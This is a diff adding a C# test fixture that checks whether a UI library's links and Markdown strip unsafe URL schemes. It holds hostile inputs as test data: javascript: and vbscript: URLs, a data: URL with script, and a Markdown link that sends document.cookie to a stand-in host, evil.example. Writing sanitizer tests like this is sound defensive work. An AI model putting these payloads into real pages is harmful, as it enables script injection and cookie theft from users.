@@ -230,6 +230,27 @@ public class ComponentParityFixtureTests
         // chevrons come first in tree order — so this picks July 1st over the 17th.
         ("calendar-picks-a-day", new eQuantic.UI.Components.Calendar(new DateOnly(2026, 7, 17)), [2]),
 
+        // LINKS AND THEIR SCHEMES (#1286): a Link, a run that links and a Markdown link carry a destination
+        // whose scheme an href may carry, and write none for any other, folded as a browser folds it.
+        ("links-with-schemes", Stack(Space.S2,
+            new Link("javascript:alert(1)", new Text("script", TypeRole.BodyM, Theme.TextPrimary)),
+            new Link(" JaVa\tScRiPt:alert(1)", new Text("folded", TypeRole.BodyM, Theme.TextPrimary)),
+            new Link("mailto:team@example.com", new Text("mail", TypeRole.BodyM, Theme.TextPrimary)),
+            new Text("", TypeRole.BodyM, Theme.TextPrimary)
+            {
+                Spans =
+                [
+                    new TextRun("data") { Destination = "data:text/html,<script>alert(1)</script>" },
+                    new TextRun("vb") { Destination = "VBSCRIPT:msgbox" },
+                    new TextRun("call") { Destination = "tel:+351210000000" },
+                    new TextRun("web") { Destination = "HTTPS://example.com" },
+                    new TextRun("here") { Destination = "#top" },
+                    new TextRun("next") { Destination = "docs/next?page=2" },
+                ],
+            },
+            new Markdown("[click](javascript:location='//evil.example/?'+document.cookie) and [docs](https://example.com/docs)")),
+            NoPresses),
+
         // LINKS UNDER A LANGUAGE (LinkLanguages): a Link and a run that links each carry the active
         // language on an app-internal href and warm it on hover, and leave somebody else's alone,
         // a protocol-relative one included. The run took its destination as written (#505).
